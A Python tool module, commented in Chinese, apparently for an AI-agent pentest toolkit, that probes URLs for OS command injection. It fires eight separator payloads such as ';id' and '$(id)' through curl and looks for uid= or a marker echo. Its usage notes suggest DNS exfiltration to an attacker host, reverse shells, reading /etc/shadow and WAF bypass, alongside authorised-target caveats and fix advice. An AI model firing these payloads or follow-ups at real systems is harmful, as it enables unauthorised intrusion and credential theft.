"""命令注入检测：对 FUZZ 占位注入 8 种分隔符 payload，验证命令回显。

白帽定位：参数拼接进系统命令（ping/file/exec 类接口）时验证注入——
;id / |id / $(id) / 反引号 / %0a 换行等分隔符，响应含 uid= 或
echo MARKER 即命中（RCE 前奏）。
"""

from __future__ import annotations

import re
from typing import Any

from .base import ToolProfile, check_installed

_URL_RE = re.compile(r"^https?://[^\s;|`$\\<>{}]{1,500}$", re.IGNORECASE)
_PAYLOAD_RE = re.compile(r"^[A-Za-z0-9%./_\-()$;&|`'\" ]{1,100}$")

_DEFAULT_PAYLOADS: list[str] = [
    ";id",              # 分号
    "|id",              # 管道
    "||id",             # 或运算
    "& id",             # 后台
    "$(id)",            # 命令替换
    "%60id%60",         # 反引号（URL 编码）
    "%0aid",            # 换行截断
    ";echo MARKER_CMD_INJECT",
]
_UID_RE = re.compile(r"\buid=\d+\([^)]*\)")
_MARKER = "MARKER_CMD_INJECT"
_MAX_PAYLOADS = 20

SCHEMAS: list[dict[str, Any]] = [
    {
        "type": "function",
        "function": {
            "name": "cmd_inject",
            "description": (
                "命令注入验证：对 URL 中 FUZZ 占位注入 8 种分隔符 payload"
                "（;id / |id / $(id) / 反引号 / %0a 换行等），响应含 uid= 或"
                "echo MARKER 即命中——RCE 前奏验证。"
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "url": {
                        "type": "string",
                        "description": "含 FUZZ 占位的 URL，如 "
                                       "http://t.com/ping?host=FUZZ",
                    },
                    "payloads": {
                        "type": "array",
                        "description": "自定义 payload 列表（可选，追加到内置 8 种）",
                        "items": {"type": "string"},
                    },
                },
                "required": ["url"],
            },
        },
    },
]


def _build_cmd(url: str) -> str:
    return f"curl -s -m 15 '{url}'"


def _is_inject_hit(raw: str) -> bool:
    """回显命中：uid=xxx(...) 特征或 echo MARKER 回显。"""
    return bool(_UID_RE.search(raw)) or _MARKER in raw


def _summarize(results: list[tuple[str, str]]) -> str:
    hits = [(p, raw) for p, raw in results if _is_inject_hit(raw)]
    head: list[str] = []
    if hits:
        head.append(f"🚨 命令注入命中 ({len(hits)}/{len(results)}):")
        for p, raw in hits:
            m = _UID_RE.search(raw)
            snippet = m.group(0)[:80] if m else (
                raw[max(0, raw.index(_MARKER) - 10):raw.index(_MARKER) + 40]
                if _MARKER in raw else raw[:80])
            head.append(f"  payload: {p}")
            head.append(f"    回显: {snippet}…")
        head.append("下一步：确认执行上下文（www-data? root?）→ 反弹 shell 或读敏感文件"
                    "（仅限授权靶场）；修复：白名单参数 + 禁用 shell 拼接。")
    else:
        head.append("✅ 未命中回显——可能被过滤或为盲注型（无回显）。")
        head.append("提示：盲注验证用时间 payload（;sleep 5 看响应延迟）；"
                    "尝试编码变体（%20、制表符、$IFS）；WAF 存在时配合 wafw00f 指纹。")
    return ToolProfile._summary("", head, tail=25)


class CmdInjectProfile(ToolProfile):
    name = "cmd_inject"
    aliases = ["命令注入", "命令执行", "cmd 注入", "rce 验证", "命令注入检测", "os 命令"]
    summary = "命令注入检测（回显验证）"
    lore = """### 命令注入检测使用要点
- 定位：参数拼进系统命令（ping?host=/exec?cmd= 类接口）→ 注入验证 RCE 前奏。
  FUZZ 占位写法：cmd_inject(url='http://t.com/ping?host=FUZZ')。
- 8 种分隔符 payload：; | || & $( ) 反引号 %0a 换行 + echo MARKER 通用回显探测。
- 判定：uid=xxx(...)（id 命令特征）或 MARKER_CMD_INJECT 回显 = 命中。
- 盲注型（无回显）：用时间 payload（;sleep 5）+ 观察响应延迟；DNS 外带
  （curl http://x.attacker.com/$(whoami)）在授权场景可用。
- 结合流程：cmd_inject 命中 → 确认权限（uid/root）→ 反弹 shell 或读 /etc/shadow
  （仅限授权靶场）→ 修复：参数白名单/禁用 shell 拼接（subprocess list 模式）。
- 注意：WAF 会拦 ; | 等分隔符，尝试 %0a、制表符、$IFS、编码变体绕过；
  每次注入都是真实命令执行——仅限授权目标，执行前确认影响。"""
    extra_schemas = SCHEMAS

    async def exec_cmd_inject(self, ex: Any, args: dict[str, Any]) -> str:
        if not check_installed("curl"):
            return "curl 未安装（apt install curl）。"
        url = str(args.get("url") or "").strip()
        if not _URL_RE.match(url):
            return f"url 格式非法: {url!r}"
        if url.count("FUZZ") != 1:
            return "url 必须且只能包含一个 FUZZ 占位（如 http://t.com/ping?host=FUZZ）。"
        payloads = list(_DEFAULT_PAYLOADS)
        extra = args.get("payloads") or []
        if not isinstance(extra, list):
            raise ValueError("payloads 必须是列表")
        for p in extra:
            p = str(p).strip()
            if not _PAYLOAD_RE.match(p):
                raise ValueError(f"payload 含非法字符: {p!r}")
            if p not in payloads:
                payloads.append(p)
        if len(payloads) > _MAX_PAYLOADS:
            raise ValueError(f"payload 总数不能超过 {_MAX_PAYLOADS}")
        results: list[tuple[str, str]] = []
        for p in payloads:
            raw = await self._run(ex, _build_cmd(url.replace("FUZZ", p)), timeout=20)
            results.append((p, raw))
        return _summarize(results)
